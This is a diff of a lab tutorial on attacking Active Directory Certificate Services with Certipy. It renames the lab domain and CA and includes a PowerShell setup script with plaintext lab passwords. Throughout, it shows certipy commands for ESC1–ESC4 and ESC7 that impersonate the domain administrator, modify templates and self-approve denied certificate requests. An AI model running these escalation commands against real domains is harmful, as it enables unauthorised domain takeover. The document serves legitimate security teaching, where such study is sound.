@@ -74,7 +74,7 @@ if (-not (Get-Module -Name ActiveDirectory -ErrorAction SilentlyContinue)) {
     Import-Module ActiveDirectory
 }
 
-Install-ADDSForest -SkipPreChecks -CreateDnsDelegation:$false -DomainName gamers.com -DomainNetBIOSName Certipied -InstallDNS -SafeModeAdministratorPassword (Convertto-SecureString -AsPlainText "53jFCM%U*TUpxNPCe%" -Force) -Force -WarningAction SilentlyContinue | Out-Null
+Install-ADDSForest -SkipPreChecks -CreateDnsDelegation:$false -DomainName gamers.com -DomainNetBIOSName Gamers -InstallDNS -SafeModeAdministratorPassword (Convertto-SecureString -AsPlainText "53jFCM%U*TUpxNPCe%" -Force) -Force -WarningAction SilentlyContinue | Out-Null
 
 Write-Host "[*] Creating new forest."
 Write-Host "[*] Promoting to domain controller."
@@ -90,7 +90,7 @@ Now you can add the respective users if you would like to follow along with the 
 ﻿
 # Create user s.jackson
   New-ADUser -Name "Sarah Jackson" -GivenName "Sarah" -Surname "Jackson" -SamAccountName "s.jackson" `
-  -UserPrincipalName "s.jackson@$Global:Domain -Path DC=certipied,DC=local" `
+  -UserPrincipalName "s.jackson@$Global:Domain -Path DC=gamers,DC=com" `
   -AccountPassword (ConvertTo-SecureString "Pr3-0wn3d@#." -AsPlainText -Force) `
   -PasswordNeverExpires $true -PassThru | Enable-ADAccount  | Out-Null
   Write-Host "[+] Domain User Sarah Jackson added. Logon: s.jackson, password: Pr3-0wn3d@#."
@@ -98,7 +98,7 @@ Now you can add the respective users if you would like to follow along with the 
 
 # Create user m.roland
   New-ADUser -Name "Michael Roland" -GivenName "Michael" -Surname "Roland" -SamAccountName "m.roland" `
-  -UserPrincipalName "m.roland@$Global:Domain -Path DC=certipied,DC=local" `
+  -UserPrincipalName "m.roland@$Global:Domain -Path DC=gamers,DC=com" `
   -AccountPassword (ConvertTo-SecureString "Acc3SsC0ntr0l" -AsPlainText -Force) `
   -PasswordNeverExpires $true -PassThru | Enable-ADAccount  | Out-Null
   Write-Host "[+] Domain User Michael Roland added. Logon: m.roland, password: Acc3SsC0ntr0l"
@@ -122,7 +122,7 @@ Install-WindowsFeature -Name Adcs-Cert-Authority -IncludeManagementTools -Warnin
 
   Write-Host "[*] Installing new Active Directory Certificate Authority. `n"
   
-  Install-AdcsCertificationAuthority -CACommonName Certipied-CA -CAType EnterpriseRootCa -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
+  Install-AdcsCertificationAuthority -CACommonName Gamers-CA -CAType EnterpriseRootCa -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
   -KeyLength 2048 -HashAlgorithmName SHA256 -ValidityPeriod Years -ValidityPeriodUnits 99 -WarningAction SilentlyContinue -Force | Out-Null
 
 ```
@@ -173,7 +173,7 @@ The `find` command is what we will use for enumeration. We'll specify the userna
 
 Otherwise the tool also saves the output in JSON format and as a .zip file that can be imported into BloodHound for visualization. We're going to work only with the .txt file in this guide.
 
-`certipy find -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -dc-ip 192.168.91.181 -text`
+`certipy find -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -dc-ip 192.168.91.181 -text`
 
 ![](/screenshots/20230724201209.png?raw=true)
 
@@ -183,7 +183,7 @@ Optionally, you could also add the `-vulnerable` flag as well, which will only o
 
 The `req` command is used for requesting, retrieving, and renewing certificates.
 
-`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d!#.' -ca Certipied-CA -template Vuln-ESC1 -upn administrator@certipied.local -dc-ip 192.168.91.159`
+`certipy req -u s.jackson@gamers.com -p 'Pr3-0wn3d!#.' -ca gamers-CA -template Vuln-ESC1 -upn administrator@gamers.com -dc-ip 192.168.91.159`
 
 Here we are also specifying the Certificate Authority with `-ca`, the name of the template we are abusing with `-template`, the User Principal Name with `-upn`.
 
@@ -230,7 +230,7 @@ Here is what we need to pay attention to so we can spot vulnerable templates our
 
 First we're going to request the vulnerable template with valid domain user credentials and specify the UPN of the administrator account.
 
-`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA -template Vuln-ESC1 -upn administrator@certipied.local -dc-ip 192.168.91.181`
+`certipy req -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -ca gamers-CA -template Vuln-ESC1 -upn administrator@gamers.com -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230724225958.png?raw=true)
 
@@ -268,13 +268,13 @@ If the requester can specify a SAN, a certificate template vulnerable to ESC2 ca
 
 Since the certificate can be used for any purpose, it can be abused using same technique as with ESC3, which we'll cover below.
 
-`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA -template Vuln-ESC2 -dc-ip 192.168.91.181`
+`certipy req -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -ca gamers-CA -template Vuln-ESC2 -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725005026.png?raw=true)
 
-We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of another user by specifying the `-on-behalf-of` flag. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `certipied` rather than `certipied.local`.
+We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of another user by specifying the `-on-behalf-of` flag. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `gamers` rather than `gamers.com`.
 
-`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA  -template User -on-behalf-of 'certipied\Administrator' -pfx s.jackson.pfx -dc-ip 192.168.91.181`
+`certipy req -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -ca gamers-CA  -template User -on-behalf-of 'gamers\Administrator' -pfx s.jackson.pfx -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725005237.png?raw=true)
 
@@ -321,13 +321,13 @@ Abusing this template will be a repeat of what we covered for ESC2.
 
 First, we must request a certificate based on the certificate template vulnerable to ESC3.
 
-`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA  -template Vuln-ESC3-1 -dc-ip 192.168.91.185`
+`certipy req -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -ca gamers-CA  -template Vuln-ESC3-1 -dc-ip 192.168.91.185`
 
 ![](/screenshots/2023-09-03_21-39.png?raw=true)
 
-We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of another user by specifying the `-on-behalf-of` flag. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `certipied` rather than `certipied.local`.
+We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of another user by specifying the `-on-behalf-of` flag. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `gamers` rather than `gamers.com`.
 
-`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA  -template User -on-behalf-of 'certipied\Administrator' -pfx s.jackson.pfx -dc-ip 192.168.91.185`
+`certipy req -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -ca gamers-CA  -template User -on-behalf-of 'gamers\Administrator' -pfx s.jackson.pfx -dc-ip 192.168.91.185`
 
 ![](/screenshots/2023-09-03_21-41.png?raw=true)
 
@@ -345,19 +345,19 @@ By default, Certipy will overwrite the configuration to make it vulnerable to ES
 
 We can specify the `-save-old` flag to save the old configuration, which is useful for restoring the configuration afterwards.
 
-`certipy template -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -template Vuln-ESC4 -dc-ip 192.168.91.181 -save-old`
+`certipy template -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -template Vuln-ESC4 -dc-ip 192.168.91.181 -save-old`
 
 ![](/screenshots/20230725005406.png?raw=true)
 
 Therefore, we can now request a certificate based on the ESC4 template and specify an arbitrary SAN with the `-upn` flag, in the exact same way we would for ESC1.
 
-`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA -template Vuln-ESC4 -upn administrator@certipied.local -dc-ip 192.168.91.181`
+`certipy req -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -ca gamers-CA -template Vuln-ESC4 -upn administrator@gamers.com -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725005455.png?raw=true)
 
 We can restore the old configuration by specifying the path to the saved configuration with the `-configuration` flag.
 
-`certipy template -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -template Vuln-ESC4 -dc-ip 192.168.91.181 -configuration Vuln-ESC4.json`
+`certipy template -u s.jackson@gamers.com -p 'Pr3-0wn3d@#.' -template Vuln-ESC4 -dc-ip 192.168.91.181 -configuration Vuln-ESC4.json`
 
 ![](/screenshots/20230725005618.png?raw=true)
 
@@ -369,13 +369,13 @@ We can restore the old configuration by specifying the path to the saved configu
 
 If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.
 
-`certipy ca -ca 'Certipied-CA' -add-officer m.roland -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`
+`certipy ca -ca 'gamers-CA' -add-officer m.roland -u m.roland@gamers.com -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725010032.png?raw=true)
 
 The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.
 
-`certipy ca -ca 'Certipied-CA' -enable-template SubCA -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`
+`certipy ca -ca 'gamers-CA' -enable-template SubCA -u m.roland@gamers.com -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725010101.png?raw=true)
 
@@ -383,17 +383,17 @@ If we have fulfilled the prerequisites for this attack, we can start by requesti
 
 This request will be denied, but we will save the private key and note down the request ID.
 
-`certipy req -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -ca Certipied-CA -template SubCA -upn administrator@certipied.local -dc-ip 192.168.91.181`
+`certipy req -u m.roland@gamers.com -p 'Acc3SsC0ntr0l' -ca gamers-CA -template SubCA -upn administrator@gamers.com -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725010221.png?raw=true)
 
 With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.
 
-`certipy ca -ca 'Certipied-CA' -issue-request 8 -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`
+`certipy ca -ca 'gamers-CA' -issue-request 8 -u m.roland@gamers.com -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725010303.png?raw=true)
 
-`certipy req -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -ca Certipied-CA -retrieve 8 -dc-ip 192.168.91.181`
+`certipy req -u m.roland@gamers.com -p 'Acc3SsC0ntr0l' -ca gamers-CA -retrieve 8 -dc-ip 192.168.91.181`
 
 ![](/screenshots/20230725010352.png?raw=true)
 
